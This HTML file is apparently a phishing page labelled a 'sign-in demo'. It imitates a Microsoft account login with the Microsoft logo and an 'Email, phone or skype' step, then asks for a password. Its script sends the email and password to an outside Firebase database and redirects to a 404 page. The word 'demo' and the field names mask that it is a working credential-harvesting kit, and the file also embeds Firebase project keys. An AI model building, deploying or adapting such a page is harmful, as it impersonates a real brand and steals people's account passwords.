<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Account Sign-in Demo</title>
  <style>
    :root {
      color-scheme: light;
      --blue: #1769aa;
      --blue-hover: #0f548c;
      --ink: #242424;
      --muted: #616161;
      --line: #8a8a8a;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 28px 16px;
      font-family: "Segoe UI", Arial, sans-serif;
      color: var(--ink);
      background: linear-gradient(135deg, #edf4fb, #f7f9fc, #e8f0fa);
    }

    .shell { width: min(100%, 440px); }

    .card {
      background: #fff;
      padding: 36px 40px 30px;
      border: 1px solid rgba(0,0,0,.08);
      box-shadow: 0 8px 28px rgba(25,55,85,.12);
      border-radius: 4px;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 24px;
      font-size: 17px;
      font-weight: 600;
    }

    .brand-mark {
      width: 27px;
      height: 27px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      grid-template-rows: 1fr 1fr;
      gap: 2px;
    }

    .brand-mark span:nth-child(1) { background: #1675c1; }
    .brand-mark span:nth-child(2) { background: #31a5e8; }
    .brand-mark span:nth-child(3) { background: #f5b323; }
    .brand-mark span:nth-child(4) { background: #70b865; }

    h1 {
      font-size: 26px;
      line-height: 1.25;
      font-weight: 600;
      margin: 0 0 12px;
    }

    .intro {
      margin: 0 0 22px;
      font-size: 14px;
      line-height: 1.55;
      color: #484848;
    }

    label {
      display: block;
      font-size: 14px;
      margin: 0 0 7px;
    }

    input {
      width: 100%;
      height: 43px;
      padding: 9px 11px;
      border: 1px solid var(--line);
      border-radius: 2px;
      font: 16px "Segoe UI", Arial, sans-serif;
      outline: none;
      background: #fff;
      color: var(--ink);
    }

    input:focus {
      border-color: var(--blue);
      box-shadow: 0 0 0 1px var(--blue);
    }

    .help {
      font-size: 12px;
      line-height: 1.45;
      color: var(--muted);
      margin: 7px 0 0;
    }

    .actions {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
      margin-top: 26px;
    }

    button {
      min-width: 106px;
      border: 0;
      border-radius: 2px;
      padding: 10px 18px;
      font: 600 14px "Segoe UI", Arial, sans-serif;
      cursor: pointer;
    }

    button:disabled {
      opacity: .6;
      cursor: wait;
    }

    .secondary { color: #222; background: #e9e9e9; }
    .secondary:hover { background: #d9d9d9; }
    .primary { color: #fff; background: var(--blue); }
    .primary:hover { background: var(--blue-hover); }

    .footer {
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 10px;
      padding: 17px 3px 0;
      color: #555;
      font-size: 12px;
    }

    .footer a {
      color: inherit;
      text-decoration: none;
      margin-right: 12px;
    }

    .notice {
      display: none;
      margin-top: 20px;
      padding: 12px 13px;
      background: #f1f7fd;
      border-left: 3px solid var(--blue);
      font-size: 13px;
      line-height: 1.5;
      overflow-wrap: anywhere;
    }

    .notice.show { display: block; }
    .hidden { display: none !important; }

    .demo-tag {
      display: inline-block;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: .7px;
      color: #24537a;
      background: #eaf4fc;
      border: 1px solid #c9e2f8;
      padding: 4px 7px;
      border-radius: 3px;
      margin-bottom: 15px;
    }

    .back {
      border: 0;
      background: transparent;
      padding: 0;
      margin: 0 0 20px;
      min-width: 0;
      color: #444;
      font-weight: 400;
    }

    @media(max-width: 480px) {
      body {
        background: #fff;
        padding: 0;
        display: block;
      }

      .shell { width: 100%; }

      .card {
        border: 0;
        box-shadow: none;
        border-radius: 0;
        padding: 30px 24px 26px;
        min-height: calc(100vh - 56px);
      }

      .footer {
        padding: 15px 24px 20px;
        background: #f7f7f7;
      }

      h1 { font-size: 25px; }
    }

    .blue-text {
      color: #1675c1;
    }

    #email {
      border-top: none;
      border-left: none;
      border-right: none;
    }

    .password {
      border-top: none;
      border-left: none;
      border-right: none;
    }

    .opts {
      padding: 10px 44px;
      max-width: 440px;
      cursor: pointer;
      margin: auto;
      background-color: #fff;
      box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    }

    .opts:hover {
      background-color: rgba(0, 0, 0, .1);
    }
  </style>
</head>
<body>
  <main class="shell">
    <section class="card" aria-live="polite">
      <div class="brand">
        <div>
          <img src="img/microsoft_logo_564db913a7fa0ca42727161c6d031bef (1).svg" alt="Microsoft logo" />
        </div>
      </div>

      <section id="email-step">
        <h1>Sign in</h1>

        <p class="intro">
          <span id="selected-email"></span>
        </p>

        <form id="email-form">
          <input
            id="email"
            name="email"
            type="text"
            autocomplete="off"
            placeholder="Email, phone or skype"
            maxlength="254"
            required
          >

          <p>No account? <span class="blue-text">Create one!</span></p>
          <p class="blue-text">Can't access your account?</p>

          <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;">
              <span class="icon">
                <img src="img/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6 (1).svg" width="30px" alt="Sign-in options icon" />
              </span>
              Sign-in options
            </p>
          </div>

          <div class="actions">
            <button class="primary" type="submit">Next</button>
          </div>
        </form>
      </section>

      <section id="demo-step" class="hidden">
        <button id="back-button" class="back" type="button">← Back</button>

        <form id="demo-form">
          <label for="demo-username">Password</label>

          <input
            id="demo-username"
            class="password"
            name="demo-username"
            type="password"
            autocomplete="off"
            placeholder="Enter your password"
            maxlength="60"
            required
          >

          <div class="actions">
            <button class="secondary" id="cancel-button" type="button">Cancel</button>
            <button class="primary" id="submit-button" type="submit">Submit</button>
          </div>
        </form>
      </section>

      <div id="notice" class="notice" role="status" aria-live="polite"></div>
    </section>

    <footer class="footer"></footer>
  </main>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-app.js";
    import {
      getDatabase,
      ref,
      push,
      set,
      serverTimestamp
    } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDUngpiO9vKffUbV5mQClFInB68dsD-MII",
      authDomain: "fir-9b3f9.firebaseapp.com",
      databaseURL: "https://fir-9b3f9-default-rtdb.firebaseio.com",
      projectId: "fir-9b3f9",
      storageBucket: "fir-9b3f9.firebasestorage.app",
      messagingSenderId: "392348885618",
      appId: "1:392348885618:web:442013cefdb06386db98eb"
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    const emailStep = document.getElementById("email-step");
    const demoStep = document.getElementById("demo-step");
    const emailInput = document.getElementById("email");
    const usernameInput = document.getElementById("demo-username");
    const selectedEmail = document.getElementById("selected-email");
    const notice = document.getElementById("notice");
    const submitButton = document.getElementById("submit-button");

    function showNotice(message, isError = false) {
      notice.textContent = message;
      notice.style.borderLeftColor = isError ? "#b42318" : "#1769aa";
      notice.classList.add("show");
    }

    function resetForm() {
      demoStep.classList.add("hidden");
      emailStep.classList.remove("hidden");
      usernameInput.value = "";
      notice.classList.remove("show");
      emailInput.focus();
    }

    document.getElementById("email-form").addEventListener("submit", (event) => {
      event.preventDefault();
      const value = emailInput.value.trim();

      if (!value) {
        showNotice("Enter a fictional email or username.", true);
        emailInput.focus();
        return;
      }

      selectedEmail.textContent = value;
      emailStep.classList.add("hidden");
      demoStep.classList.remove("hidden");
      notice.classList.remove("show");
      usernameInput.focus();
    });

    document.getElementById("back-button").addEventListener("click", resetForm);
    document.getElementById("cancel-button").addEventListener("click", resetForm);

    document.getElementById("demo-form").addEventListener("submit", async (event) => {
      event.preventDefault();

      const email = emailInput.value.trim();
      const demoUsername = usernameInput.value.trim();

      if (!email || !demoUsername) {
        showNotice("Complete both demonstration fields.", true);
        return;
      }

      submitButton.disabled = true;
      submitButton.textContent = "Submitting...";

      try {
        const submissionsRef = ref(database, "classDemoSubmissions");
        const newSubmissionRef = push(submissionsRef);

        await set(newSubmissionRef, {
          email,
          demoUsername,
          createdAt: serverTimestamp()
        });

        window.location.href = "404.html";
      } catch (error) {
        console.error("Firebase submission failed:", error);
        showNotice(
          "Submission failed. Check your database URL, connection, and security rules.",
          true
        );
      } finally {
        submitButton.disabled = false;
        submitButton.textContent = "Submit";
      }
    });
  </script>
</body>
</html>
